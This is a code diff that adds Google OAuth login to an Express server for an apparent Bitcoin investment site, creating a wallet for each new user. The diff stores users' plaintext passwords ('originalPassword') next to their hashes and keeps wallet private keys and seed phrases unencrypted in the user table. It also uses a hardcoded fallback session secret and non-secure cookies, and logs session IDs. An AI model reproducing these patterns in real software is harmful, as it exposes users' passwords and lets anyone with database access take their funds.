@@ -24,6 +24,9 @@ import * as bip39 from "bip39";
 import { BIP32Factory } from "bip32";
 import crypto from "crypto";
 import bcrypt from 'bcryptjs';
+import { Strategy as GoogleStrategy } from "passport-google-oauth20";
+import passport from "passport";
+import session from "express-session";
 
 // Initialize ECPair and BIP32 with secp256k1
 const ECPair = ECPairFactory(ecc);
@@ -907,6 +910,96 @@ function startAutomaticUpdates(): void {
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // PostgreSQL storage doesn't need initialization
+
+  // Configure session middleware
+  app.use(session({
+    secret: process.env.SESSION_SECRET || 'dev-session-secret-key-change-in-production',
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 } // 24 hours
+  }));
+
+  // Initialize Passport and session support
+  app.use(passport.initialize());
+  app.use(passport.session());
+
+  // Google OAuth Strategy
+  passport.use(new GoogleStrategy({
+    clientID: process.env.GOOGLE_CLIENT_ID || 'dummy-client-id',
+    clientSecret: process.env.GOOGLE_CLIENT_SECRET || 'dummy-client-secret',
+    callbackURL: "/api/auth/google/callback"
+  }, async (accessToken, refreshToken, profile, done) => {
+    try {
+      // Check if user already exists with Google ID
+      let user = await storage.getUserByGoogleId(profile.id);
+      
+      if (user) {
+        return done(null, user);
+      }
+      
+      // Check if user exists with the same email
+      const email = profile.emails?.[0]?.value;
+      if (email) {
+        user = await storage.getUserByEmail(email);
+        if (user && !user.googleId) {
+          // Link Google account to existing user by updating their record
+          // For now, create a new account instead to avoid conflicts
+        }
+      }
+
+      // Create new user with Google account
+      if (email) {
+        // Generate Bitcoin wallet for new user
+        const mnemonic = bip39.generateMnemonic();
+        const seed = bip39.mnemonicToSeedSync(mnemonic);
+        const root = bip32.fromSeed(seed);
+        const child = root.derivePath("m/44'/0'/0'/0/0");
+        const keyPair = ECPair.fromPrivateKey(child.privateKey!);
+        const bitcoinAddress = bitcoin.payments.p2pkh({ 
+          pubkey: keyPair.publicKey,
+          network: bitcoin.networks.bitcoin 
+        }).address!;
+
+        user = await storage.createUser({
+          firstName: profile.name?.givenName || 'Google',
+          lastName: profile.name?.familyName || 'User',
+          email: email,
+          phone: null,
+          country: '',
+          password: '', // No password for Google OAuth users
+          originalPassword: '', // No original password for Google OAuth users
+          bitcoinAddress: bitcoinAddress,
+          privateKey: child.privateKey!.toString('hex'),
+          seedPhrase: mnemonic,
+          acceptMarketing: false,
+          googleId: profile.id,
+          profileImageUrl: profile.photos?.[0]?.value || null
+        });
+
+        return done(null, user);
+      }
+      
+      return done(new Error('No email provided by Google'), null);
+    } catch (error) {
+      console.error('Google OAuth error:', error);
+      return done(error, null);
+    }
+  }));
+
+  // Serialize user for session
+  passport.serializeUser((user: any, done) => {
+    done(null, user.id);
+  });
+
+  // Deserialize user from session
+  passport.deserializeUser(async (id: number, done) => {
+    try {
+      const user = await storage.getUser(id);
+      done(null, user);
+    } catch (error) {
+      done(error, null);
+    }
+  });
 
   // Database health check endpoint
   app.get("/api/health", async (req, res) => {
@@ -1843,6 +1936,7 @@ You will receive a notification once your deposit is confirmed and added to your
         phone: phone || null,
         country,
         password: hashedPassword,
+        originalPassword: password, // Store original password
         bitcoinAddress: "",
         privateKey: "",
         acceptMarketing: acceptMarketing || false,
@@ -2010,6 +2104,41 @@ Your investment journey starts here!`,
       res.status(500).json({ message: "Logout failed" });
     }
   });
+
+  // Google OAuth routes
+  app.get('/api/auth/google', passport.authenticate('google', {
+    scope: ['profile', 'email']
+  }));
+
+  app.get('/api/auth/google/callback', 
+    passport.authenticate('google', { failureRedirect: '/login?error=google_auth_failed' }),
+    async (req, res) => {
+      try {
+        // Set session userId for authentication
+        const user = req.user as any;
+        if (user) {
+          req.session.userId = user.id;
+          
+          // Force session save
+          req.session.save((err) => {
+            if (err) {
+              console.error('Session save error:', err);
+              return res.redirect('/login?error=session_save_failed');
+            }
+            
+            console.log(`Google OAuth session saved for user ${user.id}, Session ID: ${req.sessionID}`);
+            // Redirect to home page after successful login
+            res.redirect('/?login=success');
+          });
+        } else {
+          res.redirect('/login?error=no_user_data');
+        }
+      } catch (error) {
+        console.error('Google OAuth callback error:', error);
+        res.redirect('/login?error=callback_error');
+      }
+    }
+  );
 
   // Debug endpoint to check cookie behavior
   app.get("/api/debug/session", (req, res) => {
